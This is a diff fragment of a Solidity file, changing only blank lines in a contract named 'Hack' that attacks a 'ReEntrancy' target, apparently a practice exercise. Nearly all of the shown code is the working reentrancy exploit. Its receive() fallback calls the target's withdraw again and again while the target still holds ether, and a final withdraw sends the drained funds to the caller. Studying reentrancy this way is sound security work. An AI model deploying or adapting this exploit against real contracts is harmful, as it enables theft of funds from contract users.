@@ -29,13 +29,14 @@ contract Hack {
         instance.deposite{value: msg.value}();
         instance.withdraw(0.5 ether);
     }
-    
+
     receive () external payable {
         ReEntrancy instance = ReEntrancy(target);
         if(address(instance).balance > 0) {
             instance.withdraw(address(instance).balance);
         }
     }
+
     function withdraw () public {
         msg.sender.call{value: address(this).balance}("");
     }
